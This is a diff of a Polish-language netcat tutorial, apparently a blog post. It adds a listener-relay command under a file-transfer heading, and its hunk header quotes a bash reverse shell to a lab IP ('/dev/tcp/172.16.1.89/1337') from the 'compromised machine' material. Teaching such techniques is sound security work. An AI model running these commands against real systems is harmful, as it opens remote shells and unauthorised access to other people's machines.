@@ -299,6 +299,9 @@ bash -i &> /dev/tcp/172.16.1.89/1337 0>&1
 # Co jeszcze mogę zrobić z Nc?
 ## Wysyłanie plików
 Możesz przerzucić plik i tutaj polecam **Nc** w wersji **OpenBSD** w ten sposób:
+```bash
+nc -nlktp 8001 -c "nc 127.0.0.1 8000"
+```
 {: .text-justify}
 ### Przejęta maszyna 
 Jak już wcześniej wspomniałem przełącznik **-N** działa tylko na **Nc** z **OpenBSD**. Po przesłaniu pliku program sam kończy prace. Niestety w przypadku innego - tradycyjnego, z pakietu **nmap** - trzeba po wysłaniu pliku, wcisnąć **ctrl+c** aby zakończyć.
